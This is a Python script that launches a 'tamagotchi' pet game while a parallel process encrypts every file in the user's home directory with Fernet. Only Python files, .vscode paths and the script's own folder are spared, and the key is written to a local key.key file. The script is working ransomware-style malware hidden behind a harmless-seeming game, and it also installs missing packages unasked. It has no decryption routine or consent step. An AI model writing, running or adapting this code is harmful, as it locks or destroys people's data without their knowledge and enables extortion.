import multiprocessing
import os
import subprocess
import pkg_resources
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog
import tamagotchi  # Make sure the Tamagotchi code is in a file called tamagotchi.py

REQUIRED_PACKAGES = [
    'cryptography'
]

for package in REQUIRED_PACKAGES:
    try:
        dist = pkg_resources.get_distribution(package)
        print('{} ({}) is installed'.format(dist.key, dist.version))
    except pkg_resources.DistributionNotFound:
        print('{} is NOT installed'.format(package))
        subprocess.call(['pip', 'install', package])

def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
    return key

def load_key():
    return open('key.key', 'rb').read()

def encrypt(item, key):
    if not item.endswith('.py') and not '.vscode' in item:
        f = Fernet(key)
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

def get_all_files_in_directory(dir_path, exclude_path):
    files_list = []
    for root, dirs, files in os.walk(dir_path):
        if root.startswith(exclude_path):
            continue
        for file in files:
            files_list.append(os.path.join(root, file))
    return files_list

def main_encryption():
    path_to_encrypt = os.path.expanduser('~')
    exclude_path = os.path.dirname(os.path.abspath(__file__))
    all_files = get_all_files_in_directory(path_to_encrypt, exclude_path)

    key = generate_key()

    with multiprocessing.Pool() as pool:
        pool.starmap(encrypt, [(file, key) for file in all_files])

if __name__ == '__main__':
    p1 = multiprocessing.Process(target=main_encryption)
    p2 = multiprocessing.Process(target=tamagotchi.main)

    p1.start()
    p2.start()

    p1.join()
    p2.join()